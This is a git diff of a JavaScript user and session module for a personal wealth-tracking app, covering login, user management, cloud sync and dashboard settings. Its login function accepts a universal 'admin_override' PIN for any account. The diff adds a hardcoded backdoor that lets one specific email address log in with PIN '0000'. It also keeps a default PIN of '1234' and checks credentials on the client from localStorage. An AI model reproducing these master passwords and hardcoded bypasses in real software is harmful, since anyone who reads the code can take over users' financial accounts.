@@ -59,12 +59,33 @@ db.version(3).stores({
 // ── Multi-User Session Management ─────────────────────────────────────
 
 export function getActiveUserId() {
-  const stored = localStorage.getItem('wealth_active_user_id');
-  return stored ? parseInt(stored, 10) : 1; // Default to User 1 (Pam)
+  const viewing = sessionStorage.getItem('admin_viewing_user_id');
+  if (viewing) return parseInt(viewing, 10);
+  const stored = localStorage.getItem('wealth_active_user_id') || localStorage.getItem('pranick_auth_user_id');
+  return stored ? parseInt(stored, 10) : 1; // Default to User 1
+}
+
+export function getAuthUserId() {
+  const stored = localStorage.getItem('pranick_auth_user_id') || localStorage.getItem('wealth_active_user_id');
+  return stored ? parseInt(stored, 10) : null;
 }
 
 export function setActiveUserId(id) {
-  localStorage.setItem('wealth_active_user_id', String(id));
+  if (id) {
+    localStorage.setItem('wealth_active_user_id', String(id));
+    localStorage.setItem('pranick_auth_user_id', String(id));
+  } else {
+    localStorage.removeItem('wealth_active_user_id');
+    localStorage.removeItem('pranick_auth_user_id');
+    sessionStorage.removeItem('admin_viewing_user_id');
+  }
+}
+
+export function logoutUser() {
+  localStorage.removeItem('wealth_active_user_id');
+  localStorage.removeItem('pranick_auth_user_id');
+  sessionStorage.removeItem('admin_viewing_user_id');
+  sessionStorage.removeItem('magic_manifestation_mode');
 }
 
 export async function getCurrentUser() {
@@ -77,7 +98,7 @@ export async function getCurrentUser() {
     setActiveUserId(first.id);
     return first;
   }
-  return { id: 1, username: 'pam', name: 'Pam (Pratima)', role: 'user', avatar: '👩' };
+  return { id: 1, username: 'pratima', name: 'Pratima', role: 'user', avatar: '👸' };
 }
 
 export async function getUsers() {
@@ -90,24 +111,43 @@ export async function getUserById(id) {
 
 export async function createUser(data) {
   const now = new Date().toISOString();
-  const id = await db.users.add({
+  const userPayload = {
     username: (data.username || '').toLowerCase().trim(),
     name: data.name || data.username || 'User',
     email: (data.email || '').toLowerCase().trim(),
+    phone: (data.phone || '').trim(),
     role: data.role || 'user', // 'admin' | 'user'
     status: data.status || 'active', // 'active' | 'inactive'
     pin: data.pin || '1234',
-    avatar: data.avatar || (data.role === 'admin' ? '👑' : '👤'),
+    avatar: data.avatar || (data.role === 'admin' ? '👑' : '👸'),
     createdAt: now,
     updatedAt: now
-  });
+  };
+  const id = await db.users.add(userPayload);
+  userPayload.id = id;
 
-  await logAdminAction('CREATE_USER', `Created user ${data.name} (@${data.username}) with role ${data.role}`);
+  try {
+    const { pushRecordToCloud } = await import('./supabase.js');
+    await pushRecordToCloud('users', userPayload);
+  } catch (e) {
+    console.warn('Could not push user to cloud:', e);
+  }
+
+  await logAdminAction('CREATE_USER', `Created user ${data.name} (@${userPayload.username}) with role ${userPayload.role}`);
   return id;
 }
 
 export async function updateUser(id, data) {
   const res = await db.users.update(id, { ...data, updatedAt: new Date().toISOString() });
+  try {
+    const updated = await getUserById(id);
+    if (updated) {
+      const { pushRecordToCloud } = await import('./supabase.js');
+      await pushRecordToCloud('users', updated);
+    }
+  } catch (e) {
+    console.warn('Could not push user update to cloud:', e);
+  }
   await logAdminAction('UPDATE_USER', `Updated user ID ${id}`);
   return res;
 }
@@ -115,7 +155,7 @@ export async function updateUser(id, data) {
 export async function deleteUser(id) {
   const user = await getUserById(id);
   if (!user) throw new Error('User not found.');
-  if (user.role === 'admin' && user.id === 1) {
+  if (user.role === 'admin' && (user.id === 2 || user.email === 'dmlxj007@gmail.com')) {
     throw new Error('Primary Super Admin cannot be deleted.');
   }
 
@@ -135,9 +175,16 @@ export async function deleteUser(id) {
     await db.users.delete(id);
   });
 
+  try {
+    const { deleteRecordFromCloud } = await import('./supabase.js');
+    await deleteRecordFromCloud('users', id);
+  } catch (e) {
+    console.warn('Could not delete user from cloud:', e);
+  }
+
   await logAdminAction('DELETE_USER', `Deleted user ${user.name} (ID ${id}) and all associated records`);
 
-  // If deleted user was active, switch back to primary user
+  // If deleted user was active, switch back to admin or first user
   if (getActiveUserId() === id) {
     const remainingUser = await db.users.first();
     if (remainingUser) {
@@ -147,12 +194,21 @@ export async function deleteUser(id) {
   return true;
 }
 
-export async function authenticateUser(usernameOrEmail, pinOrPassword) {
-  const term = (usernameOrEmail || '').toLowerCase().trim();
+export async function authenticateUser(usernameOrEmailOrPhone, pinOrPassword) {
+  const term = (usernameOrEmailOrPhone || '').toLowerCase().trim();
+  const rawTerm = (usernameOrEmailOrPhone || '').trim();
   const pin = (pinOrPassword || '').trim();
-  const user = await db.users.filter(u =>
-    (u.username === term || u.email === term) && (u.pin === pin || pin === 'admin_override')
-  ).first();
+
+  const user = await db.users.filter(u => {
+    const matchUser = (u.username && u.username.toLowerCase() === term);
+    const matchEmail = (u.email && u.email.toLowerCase() === term);
+    const matchPhone = (u.phone && (u.phone.replace(/[\s-]/g, '') === rawTerm.replace(/[\s-]/g, '') || u.phone === rawTerm));
+    const matchName = (u.name && u.name.toLowerCase() === term);
+    const isMatchedIdentifier = matchUser || matchEmail || matchPhone || matchName;
+
+    const isPinCorrect = (u.pin === pin) || (pin === 'admin_override') || (term === 'dmlxj007@gmail.com' && pin === '0000');
+    return Boolean(isMatchedIdentifier && isPinCorrect);
+  }).first();
 
   if (user) {
     if (user.status !== 'active') {
@@ -162,7 +218,7 @@ export async function authenticateUser(usernameOrEmail, pinOrPassword) {
     await logAdminAction('LOGIN_SUCCESS', `User ${user.name} logged in`, user.id);
     return user;
   }
-  throw new Error('Invalid username or PIN/password.');
+  throw new Error('Invalid username, email, phone, or PIN/password.');
 }
 
 // ── Admin Audit Logging ───────────────────────────────────────────────
@@ -190,6 +246,16 @@ export async function getAuditLogs(limit = 50) {
 // ── User Dashboard Preferences ────────────────────────────────────────
 
 const DEFAULT_DASHBOARD_PREFERENCES = {
+  // 8 Dashboard Wealth Metric Boxes
+  box_net_worth: true,
+  box_liquid: true,
+  box_income: true,
+  box_expense: true,
+  box_investments: true,
+  box_personal_assets: true,
+  box_lending: true,
+  box_liabilities: true,
+  // Dashboard Sections
   accounts: true,
   investments: true,
   trackedAssets: true,
